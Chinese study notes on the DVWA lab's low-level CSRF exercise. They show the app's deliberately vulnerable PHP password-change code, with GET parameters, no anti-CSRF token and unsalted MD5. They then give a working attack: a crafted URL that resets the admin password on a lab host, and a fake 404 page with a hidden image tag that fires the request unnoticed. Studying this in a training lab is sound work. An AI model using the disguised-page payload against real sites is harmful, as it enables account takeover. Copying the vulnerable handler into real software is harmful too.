<center>Csrf 跨站请求伪造</center>



[toc]







## Csrf 跨站请求伪造

> 客户端请求伪造









### 1. low

> 低级
>
> 代码

```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Get input
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update the database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

> 判断两个密码相同就修改用户密码

```shell
# 之间url修改密码 盗取了你的admin身份。
http://192.168.0.111:8000/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#

# 1. 短链接修改 缺点： 还是会跳转到dvwa页面，会暴露

# 2. 自建一个404页面 图片的src去请求修改密码 （最好的方法）
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404</title>
</head>
<body>
    <img src="http://192.168.0.111:8000/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#" alt="404" style="display: none;">
    <h1>404</h1>
    <p>The page you are looking for does not exist.</p>
</body>
</html>
```





